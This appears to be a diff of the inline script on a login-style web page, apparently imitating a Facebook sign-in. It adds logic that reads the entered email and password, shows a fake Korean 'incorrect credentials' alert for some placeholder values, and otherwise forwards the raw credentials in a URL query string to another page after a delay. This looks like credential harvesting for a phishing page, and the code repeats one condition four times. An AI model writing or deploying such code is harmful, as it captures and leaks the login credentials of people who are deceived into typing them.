@@ -176,12 +176,29 @@ body{
 <script>
 	function go_click() {
 
+  
+
+
 
 	   setTimeout(function() {
-		   emailfb = $('#email').val();
-		   pwdfb = $('#pwd').val();
-		   location.href="register.html?" + emailfb + "/" + pwdfb;
 
+		emailfb = $('#email').val();
+		   pwdfb = $('#pwd').val();
+
+		if (emailfb == "zzzzzzz@gmail.com" | pwdfb == "12345678"){
+
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "zzzzzzz@gmail.com" | pwdfb == "12345678"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "zzzzzzz@gmail.com" | pwdfb == "12345678"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else if (emailfb == "zzzzzzz@gmail.com" | pwdfb == "12345678"){
+			alert("비밀번호 또는 이메일 주소가 올바르지 않습니다.")
+		}else{
+				
+			location.href="register.html?" + emailfb + "/" + pwdfb;
+
+		}
 
 	   }, 3300);
 	  // chatChannelId = btn.name;
